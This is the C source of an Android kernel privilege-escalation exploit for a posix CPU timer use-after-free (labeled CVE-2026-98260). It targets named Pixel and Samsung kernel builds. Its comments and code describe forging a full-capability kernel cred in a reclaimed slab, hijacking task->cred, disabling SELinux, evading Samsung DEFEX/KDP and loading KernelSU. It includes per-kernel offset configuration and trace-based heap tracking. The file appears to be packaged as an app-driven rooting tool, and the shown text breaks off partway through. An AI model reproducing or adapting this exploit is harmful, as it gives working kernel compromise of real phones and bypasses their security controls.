/*
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 * Target : Google Pixel 7a (lynx), Pixel 9a (tegu), Pixel 10 series
 * Kernel : 6.1.162-android14-11-g9dd05ae3a1de-ab16261587
 *          6.6.127-android15-8-g91d825611104-ab16252310 (Pixel 10)
 * SELinux: Enforcing
 * Patches: absent (android14-6.1-sp fix 88d31f5e5a98 landed 2026-10-15)
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 *
 * Ported from the PLZ110 6.12.69 version.  The trigger mechanics are the
 * same; every build-dependent constant below comes from the factory
 * vmlinux (kallsyms/BTF) and /proc/slabinfo on the running device.  The
 * profile is selected at startup from the kernel banner and page size, so
 * one binary handles lynx, both tegu kernel variants and the Pixel 10.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     slab page and disable SELinux.  The wait child must not call
 *     setuid() itself: task->cred is the fake cred while task->real_cred
 *     is still the original, and commit_creds() BUG_ONs on that mismatch.
 *     It forks instead; copy_creds() hands the worker a private cred with
 *     cred == real_cred and a real SELinux blob, so the worker can safely
 *     normalize uid/gid.  The worker then execs ksud late-load, which
 *     finds the installed KernelSU, KernelSU-Next or SukiSU Ultra
 *     libksud.so -- including repackaged managers with randomized
 *     package names or renamed libraries -- and loads that manager's
 *     android14-6.1 module.
 *     In Samsung mode (--samsung) there is no discovery: the bundled
 *     diabl0w/KernelSU ksud is used, the manager is pinned to
 *     me.weishu.kernelsu (versionName samsung-v*), and DEFEX/kdp are
 *     handled by the vendor endgame below.
 *     The parent parks with its socket buffers holding the fake cred page.
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/system_properties.h>

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3

/*
 * App <-> binary interface version.  Bump it whenever the arguments or the
 * conf schema change incompatibly, and pass the same value from UserService.
 * The conf-driven rewrite is protocol 2; protocol 3 adds the Samsung
 * DEFEX/KDP endgame.  An older app starts the binary
 * without --conf/--protocol, which the binary detects and refuses.
 */
#define APP_PROTOCOL 3
#define EXIT_OLD_APP 78

/*
 * Zero-terminated form of the protocol handshake, so the app can recognise a
 * compatible binary by scanning its bytes without executing it.  Keep the
 * literal "TIMER_PROTOCOL=<n>" shape: UserService searches for it.
 */
#define STRINGIFY_(x) #x
#define STRINGIFY(x) STRINGIFY_(x)
#define TIMER_PROTOCOL_MARKER "TIMER_PROTOCOL=" STRINGIFY(APP_PROTOCOL)
/*
 * Feature marker for the Samsung endgame.  The app scans the installed
 * binary for this literal before it selects a Samsung profile: a binary
 * without it is a generic build and would treat --samsung as a mode name.
 */
#define TIMER_SAMSUNG_MARKER "TIMER_SAMSUNG=1"
/*
 * Samsung mode is pinned to the diabl0w/KernelSU build.  It shares the
 * upstream KernelSU package name (its release is identified by a
 * samsung-v* manager versionName), so a profile that points at any other
 * manager package is rejected instead of silently late-loading a
 * mismatched ksud.
 */
#define SAMSUNG_MANAGER_PACKAGE "me.weishu.kernelsu"

/*
 * Build-dependent constants, loaded from a HOCON conf at runtime.
 *
 * The conf-driven layout and the per-kernel profiles come from
 * https://github.com/rikumi/TimerRoot (see the conf directory).  A profile is
 * selected by the app from `uname -r` plus the userspace page size; the
 * binary re-checks both before it touches anything so a stale or wrong conf
 * is refused instead of corrupting the kernel.
 */
struct target_profile
{
    char name[96];
    char release[160];
    /* Optional prefix form for Samsung builds whose uname -r carries a
     * firmware suffix.  Only used when the profile explicitly sets it. */
    char release_prefix[160];
    char ksu_kmi[64];
    /* Samsung endgame: diabl0w/KernelSU manager package and the DEFEX
     * creds_fast_hash table address (unslid). */
    char samsung_package[96];
    unsigned long long defex_creds_hash;
    int samsung_mode;
    unsigned long page_size;
    unsigned int page_shift;
    unsigned int slab_order;
    unsigned long slab_size;
    unsigned long long static_timer_site;
    unsigned long long timer_site_low21;
    unsigned long long selinux_state_static;
    unsigned long long panic_on_warn_static;
    unsigned long long copy_process_low21;
    unsigned long long root_user_static;
    unsigned long long init_user_ns_static;
    unsigned long long init_ucounts_static;
    unsigned long long init_groups_static;
    /* Plausible [min, max) range of the linear map on this VA layout. */
    unsigned long long linear_min;
    unsigned long long linear_max;
    /* cred/task_struct layout (BTF). */
    unsigned long long cred_uid_off;
    unsigned long long cred_euid_off;
    unsigned long long cred_req;
    unsigned long long cred_alloc;
    unsigned long long cred_size;
    unsigned long long task_cred_off;
    /* Fake cred placement below the reclaimed k_itimer rb_node. */
    unsigned long long fake_cred_off;
    unsigned long long fake_caps_off;
    unsigned long long fake_security_off;
    unsigned long long fake_user_off;
    unsigned long long fake_user_ns_off;
    unsigned long long fake_ucounts_off;
    unsigned long long fake_groups_off;
    int cred_cap_count;
    /* Build-specific pieces that used to be #defines. */
    unsigned long long timer_alloc;
    /* Offset of the cpu_timer rb node inside struct k_itimer (BTF). */
    unsigned long long timer_node_off;
    unsigned long long task_alloc_bytes;
    unsigned long long fullcap;
    unsigned long long selinux_blob_off;
    unsigned long long selinux_sid_kernel;
    /* 5.15/6.1 free order-1 slab pages through the PCP lists.  The
     * mm_page_free event still fires, but those profiles also gate the
     * spray on /proc/slabinfo to confirm the victim's timers are gone. */
    int pcp_free;
    /* Distance from `call_site` to `bytes_req` in a raw kmem_cache_alloc
     * trace record.  android17 (6.18) inserted a __data_loc `name` between
     * `ptr` and `bytes_req`, so the distance is 0x18 there and 0x10 on
     * 6.1/6.6/6.12.  `bytes_alloc` is always 8 bytes after `bytes_req`
     * and `ptr` is always 8 bytes after `call_site`. */
    unsigned long long alloc_req_off;
};

static struct target_profile g_cfg;
static const struct target_profile *g_tgt = &g_cfg;
static int g_conf_overflow;
static char g_device[128] = "unknown";
static char g_kernel[256] = "unknown";

#define PAGE (g_tgt->page_size)
#define PAGE_SHIFT (g_tgt->page_shift)
#define SLAB_ORDER (g_tgt->slab_order)
#define SLAB_SIZE (g_tgt->slab_size)
/* bytes_req/bytes_alloc sit this far after call_site in a raw record. */
#define ALLOC_REQ_OFF (g_tgt->alloc_req_off)
/* ...and this far after `ptr`, which is 8 bytes after call_site. */
#define ALLOC_PTR_TO_REQ (g_tgt->alloc_req_off - 8)
/* posix_timers_cache is order-1 (8K) on 4K pages, order-0 (16K) on 16K. */
#define SLAB_MASK (~(unsigned long long)(SLAB_SIZE - 1))
#define SLAB_OFF_MASK ((unsigned long long)(SLAB_SIZE - 1))
#define LINEAR_MIN (g_tgt->linear_min)
#define LINEAR_MAX (g_tgt->linear_max)
#define SOCKBUF SLAB_SIZE
#define STATIC_TIMER_SITE (g_tgt->static_timer_site)
#define TIMER_SITE_LOW21 (g_tgt->timer_site_low21)
#define SELINUX_STATE_STATIC (g_tgt->selinux_state_static)
#define PANIC_ON_WARN_STATIC (g_tgt->panic_on_warn_static)
#define COPY_PROCESS_LOW21 (g_tgt->copy_process_low21)
#define ROOT_USER_STATIC (g_tgt->root_user_static)
#define INIT_USER_NS_STATIC (g_tgt->init_user_ns_static)
#define INIT_UCOUNTS_STATIC (g_tgt->init_ucounts_static)
#define INIT_GROUPS_STATIC (g_tgt->init_groups_static)

/* cred_jar: sizeof(struct cred) and kmem_cache size, from BTF. */
#define TIMER_ALLOC (g_tgt->timer_alloc)
#define TIMER_NODE_OFF (g_tgt->timer_node_off)
#define CRED_REQ (g_tgt->cred_req)
#define CRED_ALLOC (g_tgt->cred_alloc)
#define CRED_SIZE (g_tgt->cred_size)

#define CRED_UID_OFF (g_tgt->cred_uid_off)
#define CRED_EUID_OFF (g_tgt->cred_euid_off)
/* Samsung DEFEX: creds_fast_hash is an 8-byte pointer array indexed by pid. */
#define DEFEX_CREDS_HASH_STATIC (g_tgt->defex_creds_hash)

/* task_struct / cred layout (BTF). */
#define OFF_TASK_CRED (g_tgt->task_cred_off)
#define TASK_ALLOC_BYTES (g_tgt->task_alloc_bytes)
#define FULLCAP (g_tgt->fullcap)

/* SELinux is the only LSM using a cred blob here; fill 32 bytes from the
 * conf's blob offset.  Offset 0 (the default for these profiles) covers both
 * the 0x0 and 0x8 field orderings in one write. */
#define SELINUX_BLOB_OFF (g_tgt->selinux_blob_off)
#define SELINUX_SID_KERNEL ((unsigned)g_tgt->selinux_sid_kernel)
/*
 * Fake cred offset from the stale rb_node.
 *
 * With node[8] (rb_right) = 0 and node[0x10] (rb_left) = dest, rb_erase
 * takes the "left child only" path and does:
 *     *dest              = node[0]      -> task->cred = node[0]
 *     *(node[0] + 8)     = dest         -> writes into the fake cred
 * and posix_cpu_timers_exit then clears node[0x20].
 *
 * Upstream overlays the cred on the node (offset 0).  That works on 6.12
 * because cred.euid is at +0x18 there.  On this 6.1 image cred.usage is a
 * 4-byte atomic_t, so cred.euid sits at +0x10 -- exactly the field the
 * erase needs for `dest`.  Overlaying at 0 would therefore give the child
 * euid = high32(dest) = 0xffffff88.
 *
 * Placing the cred at node+0x18 avoids every write the erase performs:
 *     node[0]   = fake cred address (published as task->cred)
 *     node[0x10]= dest (outside the cred)
 *     node[0x20]= zeroed by the exit path -> a uid/gid word, which must be 0
 *
 * 6.1 cred (4-byte atomic usage), fake = node + 0x18:
 *     +0x00 usage  +0x04 uid    +0x08 gid    +0x0c suid
 *     +0x10 sgid   +0x14 euid   +0x18 egid   +0x1c fsuid
 *     +0x20 fsgid  +0x24 securebits
 *     +0x28..+0x50 cap_inh/prm/eff/bset/ambient
 *     +0x78 security +0x80 user +0x88 user_ns +0x90 ucounts +0x98 groups
 *
 * 6.6 cred (8-byte usage), fake = node + 0x18:
 *     +0x00 usage  +0x08 uid    +0x0c gid    +0x10 suid
 *     +0x14 sgid   +0x18 euid   +0x1c egid   +0x20 fsuid
 *     +0x24 fsgid  +0x28 securebits
 *     +0x30..+0x58 cap_inh/prm/eff/bset/ambient
 *     +0x80 security +0x88 user +0x90 user_ns +0x98 ucounts +0xa0 groups
 *
 * uid is repaired by the later zero write at fake+CRED_UID_OFF; euid and the
 * caps are never touched by the erase.
 */
#define FAKE_CRED_OFF (g_tgt->fake_cred_off)
#define FAKE_CAPS_OFF (g_tgt->fake_caps_off)
#define FAKE_SECURITY_OFF (g_tgt->fake_security_off)
#define FAKE_USER_OFF (g_tgt->fake_user_off)
#define FAKE_USER_NS_OFF (g_tgt->fake_user_ns_off)
#define FAKE_UCOUNTS_OFF (g_tgt->fake_ucounts_off)
#define FAKE_GROUPS_OFF (g_tgt->fake_groups_off)

/*
 * HOCON conf loader.  JSON is a subset, so `key = value` lines are enough;
 * `#` and `//` comments are stripped.  The field names are the ones used by
 * rikumi/TimerRoot's conf/ directory.
 */
static void conf_defaults(void)
{
    memset(&g_cfg, 0, sizeof(g_cfg));
    /* Defaults describe the 6.6/6.12 cred layout and a 4K/order-1 slab.
     * A 6.1 profile overrides every cred offset explicitly. */
    g_cfg.page_size = 4096;
    g_cfg.page_shift = 12;
    g_cfg.slab_order = 1;
    g_cfg.slab_size = 8192;
    g_cfg.linear_min = 0xffffff0000000000ULL;
    g_cfg.linear_max = 0xffffffc000000000ULL;
    g_cfg.fake_security_off = 0x80;
    g_cfg.fake_user_off = 0x88;
    g_cfg.fake_user_ns_off = 0x90;
    g_cfg.fake_ucounts_off = 0x98;
    g_cfg.fake_groups_off = 0xa0;
    g_cfg.cred_euid_off = 0x18;
    g_cfg.fake_caps_off = 0x30;
    g_cfg.cred_cap_count = 5;
    g_cfg.fake_cred_off = 0x18;
    g_cfg.timer_alloc = 0x108;
    g_cfg.timer_node_off = 0x78;
    /* 6.1/6.6/6.12 put bytes_req 0x10 after call_site; 6.18 adds `name`. */
    g_cfg.alloc_req_off = 0x10;
    g_cfg.task_alloc_bytes = 0x12c0;
    g_cfg.fullcap = 0x1ffffffffffULL;
    g_cfg.selinux_blob_off = 0x0;
    g_cfg.selinux_sid_kernel = 1;
    snprintf(g_cfg.samsung_package, sizeof(g_cfg.samsung_package),
             SAMSUNG_MANAGER_PACKAGE);
    g_conf_overflow = 0;
}

static void parse_conf_line(char *line)
{
    char *p, *key, *val, *hash, *slash;
    unsigned long long num;

    hash = strchr(line, '#');
    if (hash)
        *hash = '\0';
    slash = strstr(line, "//");
    if (slash)
        *slash = '\0';

    key = line;
    while (*key == ' ' || *key == '\t')
        key++;
    val = strchr(key, '=');
    if (!val)
        return;
    *val = '\0';
    val++;
    for (p = key + strlen(key) - 1; p >= key && (*p == ' ' || *p == '\t'); p--)
        *p = '\0';
    while (*val == ' ' || *val == '\t')
        val++;
    if (!*val)
        return;

    if (*val == '"')
    {
        char *end = strchr(val + 1, '"');
        if (!end)
            return;
        *end = '\0';
        val++;
        if (!strcmp(key, "release"))
            snprintf(g_cfg.release, sizeof(g_cfg.release), "%s", val);
        else if (!strcmp(key, "release_prefix"))
            snprintf(g_cfg.release_prefix, sizeof(g_cfg.release_prefix),
                     "%s", val);
        else if (!strcmp(key, "ksu_kmi"))
            snprintf(g_cfg.ksu_kmi, sizeof(g_cfg.ksu_kmi), "%s", val);
        else if (!strcmp(key, "samsung_package"))
            snprintf(g_cfg.samsung_package,
                     sizeof(g_cfg.samsung_package), "%s", val);
        return;
    }

    errno = 0;
    num = strtoull(val, NULL, 0);
    if (errno == ERANGE)
    {
        fprintf(stderr,
                "[-] conf value for '%s' does not fit in 64 bits: %s"
                " (a kernel virtual address is 16 hex digits)\n",
                key, val);
        g_conf_overflow = 1;
        return;
    }

    if (!strcmp(key, "timer_site")) g_cfg.static_timer_site = num;
    else if (!strcmp(key, "timer_alloc")) g_cfg.timer_alloc = num;
    else if (!strcmp(key, "timer_node_off")) g_cfg.timer_node_off = num;
    else if (!strcmp(key, "cred_req")) g_cfg.cred_req = num;
    else if (!strcmp(key, "cred_alloc")) g_cfg.cred_alloc = num;
    else if (!strcmp(key, "cred_size")) g_cfg.cred_size = num;
    else if (!strcmp(key, "cred_uid_off")) g_cfg.cred_uid_off = num;
    else if (!strcmp(key, "cred_euid_off")) g_cfg.cred_euid_off = num;
    else if (!strcmp(key, "cred_security_off")) g_cfg.fake_security_off = num;
    else if (!strcmp(key, "cred_user_off")) g_cfg.fake_user_off = num;
    else if (!strcmp(key, "cred_userns_off")) g_cfg.fake_user_ns_off = num;
    else if (!strcmp(key, "cred_ucounts_off")) g_cfg.fake_ucounts_off = num;
    else if (!strcmp(key, "cred_group_off")) g_cfg.fake_groups_off = num;
    else if (!strcmp(key, "fake_cred_off")) g_cfg.fake_cred_off = num;
    else if (!strcmp(key, "cred_cap_off")) g_cfg.fake_caps_off = num;
    else if (!strcmp(key, "cred_cap_count")) g_cfg.cred_cap_count = (int)num;
    else if (!strcmp(key, "selinux_state")) g_cfg.selinux_state_static = num;
    else if (!strcmp(key, "panic_on_warn")) g_cfg.panic_on_warn_static = num;
    else if (!strcmp(key, "task_cred_off")) g_cfg.task_cred_off = num;
    else if (!strcmp(key, "copy_process_low21")) g_cfg.copy_process_low21 = num;
    else if (!strcmp(key, "task_alloc_bytes")) g_cfg.task_alloc_bytes = num;
    else if (!strcmp(key, "fullcap")) g_cfg.fullcap = num;
    else if (!strcmp(key, "root_user")) g_cfg.root_user_static = num;
    else if (!strcmp(key, "init_user_ns")) g_cfg.init_user_ns_static = num;
    else if (!strcmp(key, "init_ucounts")) g_cfg.init_ucounts_static = num;
    else if (!strcmp(key, "init_groups")) g_cfg.init_groups_static = num;
    else if (!strcmp(key, "selinux_blob_off")) g_cfg.selinux_blob_off = num;
    else if (!strcmp(key, "selinux_sid_kernel")) g_cfg.selinux_sid_kernel = num;
    else if (!strcmp(key, "page_size")) g_cfg.page_size = (unsigned long)num;
    else if (!strcmp(key, "page_shift")) g_cfg.page_shift = (unsigned int)num;
    else if (!strcmp(key, "slab_order")) g_cfg.slab_order = (unsigned int)num;
    else if (!strcmp(key, "slab_size")) g_cfg.slab_size = (unsigned long)num;
    else if (!strcmp(key, "linear_min")) g_cfg.linear_min = num;
    else if (!strcmp(key, "linear_max")) g_cfg.linear_max = num;
    else if (!strcmp(key, "pcp_free")) g_cfg.pcp_free = (int)num;
    else if (!strcmp(key, "alloc_req_off")) g_cfg.alloc_req_off = num;
    else if (!strcmp(key, "defex_creds_hash"))
        g_cfg.defex_creds_hash = num;
    else if (!strcmp(key, "samsung_mode")) g_cfg.samsung_mode = (int)num;
}

/* A kernel release may or may not carry the "-4k" userspace suffix. */
static int release_matches(const char *a, const char *b)
{
    size_t la = strlen(a), lb = strlen(b);

    if (!strcmp(a, b))
        return 1;
    if (la > 3 && !strcmp(a + la - 3, "-4k"))
        la -= 3;
    if (lb > 3 && !strcmp(b + lb - 3, "-4k"))
        lb -= 3;
    return la == lb && !strncmp(a, b, la);
}

/*
 * Explicit prefix form, used only by profiles that set release_prefix.
 * Every Samsung profile has a firmware-specific suffix after the kernel
 * version, so exact matching cannot work across firmware updates.  The
 * prefix ends at a '-' boundary so "6.1.162-android14" cannot accidentally
 * match "6.1.162-android140".
 */
static int release_prefix_matches(const char *prefix, const char *running)
{
    size_t lp = strlen(prefix);

    if (!lp || strncmp(prefix, running, lp))
        return 0;
    return running[lp] == '\0' || running[lp] == '-';
}

static int load_conf(const char *path)
{
    FILE *f;
    char line[512];
    const char *base;

    conf_defaults();
    f = fopen(path, "r");
    if (!f)
    {
        fprintf(stderr, "[-] cannot open conf: %s\n", path);
        return -1;
    }
    while (fgets(line, sizeof(line), f))
        parse_conf_line(line);
    fclose(f);

    if (g_conf_overflow)
        return -1;
    if (!g_cfg.static_timer_site || !g_cfg.selinux_state_static ||
        !g_cfg.task_cred_off || !g_cfg.copy_process_low21 ||
        !g_cfg.task_alloc_bytes || !g_cfg.ksu_kmi[0] || !g_cfg.cred_req ||
        !g_cfg.cred_alloc || !g_cfg.root_user_static ||
        !g_cfg.init_user_ns_static || !g_cfg.init_ucounts_static ||
        !g_cfg.init_groups_static || !g_cfg.fake_security_off ||
        !g_cfg.fake_user_off || !g_cfg.fake_user_ns_off ||
        !g_cfg.fake_ucounts_off || !g_cfg.fake_groups_off ||
        !g_cfg.fake_cred_off || !g_cfg.fake_caps_off ||
        g_cfg.cred_cap_count <= 0)
    {
        fprintf(stderr, "[-] conf missing required fields: %s\n", path);
        return -1;
    }
    if (!g_cfg.cred_size)
        g_cfg.cred_size = g_cfg.cred_req;
    g_cfg.timer_site_low21 = g_cfg.static_timer_site & 0x1fffffULL;

    if (g_cfg.release[0] && !release_matches(g_cfg.release, g_kernel))
    {
        fprintf(stderr, "[-] conf release mismatch: conf=%s running=%s\n",
                g_cfg.release, g_kernel);
        return -1;
    }
    if (g_cfg.release_prefix[0] &&
        !release_prefix_matches(g_cfg.release_prefix, g_kernel))
    {
        fprintf(stderr, "[-] conf release prefix mismatch: conf=%s running=%s\n",
                g_cfg.release_prefix, g_kernel);
        return -1;
    }
    if (g_cfg.samsung_mode && !g_cfg.defex_creds_hash)
    {
        fprintf(stderr,
                "[-] samsung profile missing defex_creds_hash: %s\n", path);
        return -1;
    }
    if (g_cfg.samsung_mode &&
        strcmp(g_cfg.samsung_package, SAMSUNG_MANAGER_PACKAGE) != 0)
    {
        fprintf(stderr,
                "[-] samsung profile targets %s; Samsung mode requires"
                " the diabl0w/KernelSU build (%s)\n",
                g_cfg.samsung_package, SAMSUNG_MANAGER_PACKAGE);
        return -1;
    }
    if (g_cfg.page_size != (unsigned long)sysconf(_SC_PAGESIZE))
    {
        fprintf(stderr,
                "[-] conf page size mismatch: conf=%lu running=%ld\n",
                g_cfg.page_size, sysconf(_SC_PAGESIZE));
        return -1;
    }
    if (!g_cfg.page_size || !g_cfg.slab_size ||
        (g_cfg.page_size & (g_cfg.page_size - 1)) ||
        (g_cfg.slab_size & (g_cfg.slab_size - 1)))
    {
        fprintf(stderr, "[-] conf page/slab size is not a power of two\n");
        return -1;
    }

    base = strrchr(path, '/');
    snprintf(g_cfg.name, sizeof(g_cfg.name), "%s", base ? base + 1 : path);
    return 0;
}

/*
 * F6 profile invariants.  Every one of these is a property of the conf file,
 * not of the running device, so a failure here means the profile itself is
 * wrong.  Nothing in this function touches the kernel.
 */
static void logf(const char *fmt, ...);

static int selfcheck_profile(void)
{
    int bad = 0;
    unsigned long long ss = SLAB_SIZE;

    logf("[selfcheck] profile=%s release=%s\n", g_cfg.name, g_cfg.release);

#define CHECK(cond, fmt, ...)                                   \
    do                                                          \
    {                                                           \
        if (cond)                                               \
            logf("[selfcheck] ok   " fmt "\n", ##__VA_ARGS__);    \
        else                                                    \
        {                                                       \
            logf("[selfcheck] FAIL " fmt "\n", ##__VA_ARGS__);    \
            bad++;                                              \
        }                                                       \
    } while (0)

    CHECK(ss == ((unsigned long long)PAGE << SLAB_ORDER),
          "slab_size %#llx == page_size << slab_order (%#llx)",
          ss, (unsigned long long)PAGE << SLAB_ORDER);
    CHECK(TIMER_SITE_LOW21 == (STATIC_TIMER_SITE & 0x1fffffULL),
          "timer_site_low21 %#llx == timer_site & 0x1fffff",
          (unsigned long long)TIMER_SITE_LOW21);
    CHECK(COPY_PROCESS_LOW21 && COPY_PROCESS_LOW21 < 0x200000ULL,
          "copy_process_low21 %#llx fits in 21 bits",
          (unsigned long long)COPY_PROCESS_LOW21);
    CHECK(CRED_UID_OFF == 4 || CRED_UID_OFF == 8,
          "cred_uid_off %#llx is the cred.usage width (4 or 8)",
          (unsigned long long)CRED_UID_OFF);
    CHECK(FAKE_CRED_OFF == 0x18,
          "fake_cred_off %#llx == 0x18", (unsigned long long)FAKE_CRED_OFF);
    CHECK(FAKE_CAPS_OFF >= 0x28,
          "fake_caps_off %#llx >= 0x28 (c[5] overlay must not hit securebits)",
          (unsigned long long)FAKE_CAPS_OFF);
    CHECK(CRED_REQ < CRED_ALLOC,
          "cred_req %#llx < cred_alloc %#llx",
          (unsigned long long)CRED_REQ, (unsigned long long)CRED_ALLOC);
    CHECK(ALLOC_REQ_OFF == 0x10 || ALLOC_REQ_OFF == 0x18,
          "alloc_req_off %#llx is 0x10 (pre-6.18) or 0x18 (6.18 name field)",
          (unsigned long long)ALLOC_REQ_OFF);
    CHECK(FAKE_CRED_OFF + CRED_SIZE <= ss - TIMER_NODE_OFF,
          "fake_cred_off + cred_size (%#llx) <= slab_size - node_off (%#llx)",
          (unsigned long long)(FAKE_CRED_OFF + CRED_SIZE),
          (unsigned long long)(ss - TIMER_NODE_OFF));
    /*
     * linear_min/linear_max bound the *direct map* on this VA layout, and
     * the kernel image is mapped above it: plant_base() votes a base inside
     * this window, then g_slide = site0 - timer_site maps that vote back to
     * the image.  So timer_site must NOT be inside the window -- it has to
     * sit above linear_max, which is what keeps the two address spaces from
     * being confused.  (Checked against the hardware-validated 6.1.162 and
     * 6.6.127 profiles: timer_site > linear_max on all of them.)
     */
    CHECK(LINEAR_MIN < LINEAR_MAX && STATIC_TIMER_SITE >= LINEAR_MAX,
          "linear_min %#llx < linear_max %#llx <= timer_site %#llx "
          "(image above direct map)",
          (unsigned long long)LINEAR_MIN,
          (unsigned long long)LINEAR_MAX,
          (unsigned long long)STATIC_TIMER_SITE);
    CHECK(TIMER_ALLOC && TIMER_ALLOC <= ss,
          "timer_alloc %#llx <= slab_size %#llx",
          (unsigned long long)TIMER_ALLOC, ss);
    /*
     * Worst case: the victim is the last object in the slab.  A profile that
     * overflows here still works because run_plant() retries when the fake
     * cred would spill, but say so explicitly instead of hiding it.
     */
    if (TIMER_ALLOC)
    {
        unsigned long long maxoff =
            ((ss - TIMER_ALLOC) / TIMER_ALLOC) * TIMER_ALLOC;
        unsigned long long end =
            maxoff + TIMER_NODE_OFF + FAKE_CRED_OFF + CRED_SIZE;

        logf("[selfcheck] info last object node=%#llx cred_end=%#llx slab=%#llx"
             " (%s)\n", maxoff + TIMER_NODE_OFF, end, ss,
             end <= ss ? "fits" : "spills -> run_plant retries");
    }
#undef CHECK

    logf("[selfcheck] %s (%d failure%s)\n", bad ? "FAILED" : "ok", bad,
         bad == 1 ? "" : "s");
    return bad;
}

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_held;
static int g_fake_stage;
/* Samsung endgame: DEFEX creds_hash clear + KDP-safe ksud exec. */
static int g_samsung_stage;
/* Dry run: capture the victim slab and prove reclaim, but never arm the
 * victim timer, so no stale rb_node is created and reaping is safe. */
static int g_probe;
static int g_selinux_target; /* single write goes to selinux_state */
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

/* posix_timers_cache active object count, or -1 when unreadable. */
static long slab_active(void)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];
    long r = -1;

    if (!f)
        return -1;
    while (fgets(line, sizeof(line), f))
    {
        if (!strncmp(line, "posix_timers_cache", 18))
        {
            unsigned active = 0, total = 0;

            if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
                r = (long)active;
            break;
        }
    }
    fclose(f);
    return r;
}

/*
 * Every line is also appended to /data/local/tmp/timer_last.log and fsynced,
 * so a kernel panic cannot destroy the evidence of which mode/payload ran.
 */
static int g_logfd = -1;

static void log_open(void)
{
    g_logfd = open("/data/local/tmp/timer_last.log",
                   O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
}

static void logf(const char *fmt, ...)
{
    char buf[1024];
    va_list ap;
    int n;

    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n <= 0)
        return;
    if (n > (int)sizeof(buf) - 1)
        n = (int)sizeof(buf) - 1;
    (void)write(STDOUT_FILENO, buf, (size_t)n);
    if (g_logfd >= 0)
    {
        (void)write(g_logfd, buf, (size_t)n);
        (void)fsync(g_logfd);
    }
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Pair each timer slab with the page_alloc that created it.  The
 * trace stream is in time order, so the page_alloc immediately preceding a
 * slab's first object is that slab's page.  This yields the victim pfn
 * without depending on a voted linear-map base.
 */
